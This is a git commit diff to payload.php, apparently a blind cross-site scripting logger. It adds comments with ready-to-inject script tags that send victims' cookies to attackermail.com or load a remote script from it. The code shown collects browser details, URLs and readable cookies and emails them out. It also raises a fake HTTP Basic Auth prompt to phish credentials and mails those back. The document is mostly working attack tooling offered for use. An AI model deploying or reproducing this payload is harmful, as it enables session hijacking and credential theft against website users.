ab6caae077dee65925e4135f5dc09fca86b5f788
Ricardo <ricardojba@users.noreply.github.com>
2017-01-13 09:05:08 +0000

    add description on code

--- payload.php
+++ payload.php
@@ -1,4 +1,9 @@
-<?php header('Content-Type: text/javascript'); ?>
+<?php
+// Host this file on webserver and inject it on vulnerable page.
+// <script>new Image().src="https://attackermail.com/xsslogger.php?cookie="+document.cookie;</script>
+// <script src="https://attackermail.com/xss-blind.php"></script>
+header('Content-Type: text/javascript');
+?>
 var mailer = '<?php echo "//" . $_SERVER["SERVER_NAME"] . $_SERVER["REQUEST_URI"] ?>';
 var msg = 'USER AGENT\n' + navigator.userAgent + '\n\nTARGET URL\n' + document.URL;
 msg += '\n\nREFERRER URL\n' + document.referrer + '\n\nREADABLE COOKIES\n' + document.cookie;
@@ -21,12 +26,11 @@ $headers = "From: xssed@victim.org" . "\r\n";
 if ($origin && $msg) {
   mail($to, $subject, $msg, $headers);
 }
-
+// Phish for creds on HTTP Basic Auth protected backends
 if (!isset($_SERVER['PHP_AUTH_USER']) && !isset($_SERVER['PHP_AUTH_PW'])) {
   header("WWW-Authenticate: Basic realm=\"Protected Area\"");
   header("HTTP/1.0 401 Unauthorized");
-}
-else {
+} else {
   $subject2 = "XSS Blind Report: HTTP Basic Auth Creds";
   $msg2 = $_SERVER['PHP_AUTH_USER'] .":".$_SERVER['PHP_AUTH_PW'];
   mail($to, $subject2, $msg2, $headers);
